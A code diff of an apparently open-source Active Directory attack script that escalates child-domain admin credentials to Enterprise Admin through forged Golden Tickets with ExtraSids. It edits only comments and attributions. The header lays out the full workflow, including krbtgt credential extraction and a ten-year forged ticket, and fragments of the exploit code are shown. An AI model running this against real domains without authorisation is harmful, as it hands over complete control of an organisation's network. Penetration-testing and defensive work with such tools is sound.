@@ -9,23 +9,23 @@
 #
 # Description:
 #   This script implements a child-domain to forest privilege escalation
-#   as detailed by Sean Metcalf at https://adsecurity.org/?p=1640. We will
+#   as detailed by Sean Metcalf (@PyroTek3) at https://adsecurity.org/?p=1640. We will
 #   be (ab)using the concept of Golden Tickets and ExtraSids researched and implemented
 #   by Benjamin Delpy (@gentilkiwi) in mimikatz (https://github.com/gentilkiwi/mimikatz).
 #   The idea of automating all these tasks came from @mubix.
 #
 #   The workflow is as follows:
 #       Input:
-#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'i
+#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
 #              The domain specified MUST be the domain FQDN.
 #           2) Optionally a pathname to save the generated golden ticket (-w switch)
 #           3) Optionally a target to PSEXEC with Enterprise Admin privieleges to (-target-exec switch)
 #
 #       Process:
-#           1) Find out where the child domain controller is located and get its info (via MS_NRPC)
-#           2) Find out what the forest FQDN is (via MS_NRPC)
-#           3) Get the forest's Enterprise Admin SID (via XXX)
-#           4) Get the child domain's krbtgt credentials (via MS_DRSR)
+#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
+#           2) Find out what the forest FQDN is (via [MS-NRPC])
+#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])
+#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])
 #           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
 #              and setting expiration 10 years from now
 #           6) Use the generated ticket to log into the forest and get the krbtgt/admin info
@@ -1249,11 +1249,11 @@ class RAISECHILD:
     def raiseUp(self, childName, childCreds, parentName):
         logging.info('Raising %s to %s' % (childName, parentName))
 
-        # 3) Get the parents's Enterprise Admin SID (via XXX)
+        # 3) Get the parents's Enterprise Admin SID (via [MS-LSAT])
         entepriseSid, adminName = self.getParentSidAndAdminName(parentName, childCreds)
         logging.info('%s Enterprise Admin SID is: %s-519' % (parentName,entepriseSid))
 
-        # 4) Get the child domain's krbtgt credentials (via MS_DRSR)
+        # 4) Get the child domain's krbtgt credentials (via [MS-DRSR])
         targetUser = 'krbtgt'
         logging.info('Getting credentials for %s' % childName)
         rid, credentials = self.getCredentials(targetUser, childName, childCreds)
@@ -1343,12 +1343,12 @@ class RAISECHILD:
         return adminCreds, TGT, TGS
 
     def exploit(self):
-        # 1) Find out where the child domain controller is located and get its info (via MS_NRPC)
+        # 1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
         childCreds = self.__creds
         childName, forestName = self.getChildInfo(self.__creds)
         logging.info('Raising child domain %s' % childName)
 
-        # 2) Find out what the forest FQDN is (via MS_NRPC)
+        # 2) Find out what the forest FQDN is (via [MS-NRPC])
         logging.info('Forest FQDN is: %s' % forestName)
 
         # Let's raise up our child!
